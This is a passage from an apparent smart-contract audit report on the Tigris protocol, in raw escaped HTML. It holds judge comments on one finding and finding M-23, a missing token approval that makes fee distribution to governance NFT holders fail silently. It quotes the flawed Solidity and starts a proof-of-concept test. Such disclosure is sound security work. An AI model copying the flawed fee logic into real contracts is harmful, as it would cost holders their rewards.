bond holder I rate it as HIGH. </p>\n</blockquote>\n<p>Funds are not lost, they will be redistributed when the bond is expired.\n<a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L180\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L180</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1399439420\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I’ve asked the Warden for additional proof.  </p>\n<p><em>(Note: See <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1399439420\">original submission</a> for proof.)</em></p>\n<p>And believe that the finding is valid.</p>\n<p>I have adapted the test to also claim after, and believe that the lost rewards cannot be received back (see POC and different values we get back).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/630#issuecomment-1399439953\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I have to agree with the Warden’s warning, however, the <code>release</code> function is public, meaning anybody can break expired locks.</p>\n<p>For this reason, I believe that Medium Severity is more appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-23-governance-nft-holder-whose-nft-was-minted-before-trading_handleopenfees-function-is-called-can-lose-deserved-rewards-after-trading_handleopenfees-function-is-called\" style=\"position:relative;\"><a href=\"#m-23-governance-nft-holder-whose-nft-was-minted-before-trading_handleopenfees-function-is-called-can-lose-deserved-rewards-after-trading_handleopenfees-function-is-called\" aria-label=\"m 23 governance nft holder whose nft was minted before trading_handleopenfees function is called can lose deserved rewards after trading_handleopenfees function is called permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/649\">[M-23] Governance NFT holder, whose NFT was minted before <code>Trading._handleOpenFees</code> function is called, can lose deserved rewards after <code>Trading._handleOpenFees</code> function is called</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/649\">rbserver</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/671\">HE1M</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/337\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/324\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/299\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/285\">KingNFT</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/256\">stealthyz</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294</a></p>\n<h3 id=\"impact-15\" style=\"position:relative;\"><a href=\"#impact-15\" aria-label=\"impact 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Calling the following <code>Trading._handleOpenFees</code> function does not approve the <code>GovNFT</code> contract for spending any of the <code>Trading</code> contract’s <code>_tigAsset</code> balance, which is unlike calling the <code>Trading._handleCloseFees</code> function below that executes <code>IStable(_tigAsset).approve(address(gov), type(uint).max)</code>. Due to this lack of approval, when calling the <code>Trading._handleOpenFees</code> function without the <code>Trading._handleCloseFees</code> function being called for the same <code>_tigAsset</code> beforehand, the <code>GovNFT.distribute</code> function’s execution of <code>IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount)</code> in the <code>try...catch...</code> block will not transfer any <code>_tigAsset</code> amount as the trade’s DAO fees to the <code>GovNFT</code> contract. </p>\n<p>In this case, although the Governance NFT holder, whose NFT was minted before the <code>Trading._handleOpenFees</code> function is called, deserves the rewards from the DAO fees generated by the trade, this holder does not have any pending rewards after such <code>Trading._handleOpenFees</code> function call because none of the DAO fees were transferred to the <code>GovNFT</code> contract. Hence, this Governance NFT holder loses the rewards that she or he is entitled to.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_handleOpenFees</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_trader</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_isBot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_feePaid</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_daoFeesPaid</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_fees</span><span class=\"mtk1\">.</span><span class=\"mtk12\">daoFees</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IStable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_daoFeesPaid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gov</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IStable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_handleCloseFees</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_payout</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_trader</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_isBot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payout_</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IStable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_daoFeesPaid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IStable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gov</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_daoFeesPaid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payout_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">assetsIndex</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">]] == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) || </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || !</span><span class=\"mtk12\">_allowedAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">]) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">accRewardsPerNFT</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">/</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-33\" style=\"position:relative;\"><a href=\"#proof-of-concept-33\" aria-label=\"proof of concept 33 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Functions like <code>Trading.initiateMarketOrder</code> further call the <code>Trading._handleOpenFees</code> function so this POC uses the <code>Trading.initiateMarketOrder</code> function.</p>\n<p>Please add the following test in the <code>Signature verification</code> <code>describe</code> block in <code>test\\07.Trading.js</code>. This test will pass to demonstrate the described scenario. Please see the comments in this test for more details.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called, can lose deserved rewards after initiateMarketOrder function is called&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TradeInfo</span><span class=\"mtk1\"> = [</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;30000&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10000&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span class=\"mtk12\">HashZero</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PriceData</span><span class=\"mtk1\"> = [</span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;20000&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2000000000</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">message</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk12\">defaultAbiCoder</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          [</span><span class=\"mtk8\">&#39;address&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bool&#39;</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          [</span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;20000&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2000000000</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sig</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk11\">signMessage</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">Buffer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">from</span><span class=\"mtk1\">(</span><span class=\"mtk12\">message</span><span class=\"mtk1\">.</span><span class=\"mtk11\">substring</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;hex&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PermitData</span><span class=\"mtk1\"> = [</span><span class=\"mtk12\">permitSig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deadline</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MaxUint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">permitSig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">v</span><span class=\"mtk1\">, </span><span class=\"mtk12\">permitSig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">r</span><span class=\"mtk1\">, </span><span class=\"mtk12\">permitSig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// one Governance NFT is minted to owner before initiateMarketOrder function is called</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;GovNFT&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;GovNFT&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">initiateMarketOrder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TradeInfo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">PriceData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sig</span><span class=\"mtk1\">, </span><span class=\"mtk12\">PermitData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">emit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trading</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;FeesDistributed&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span 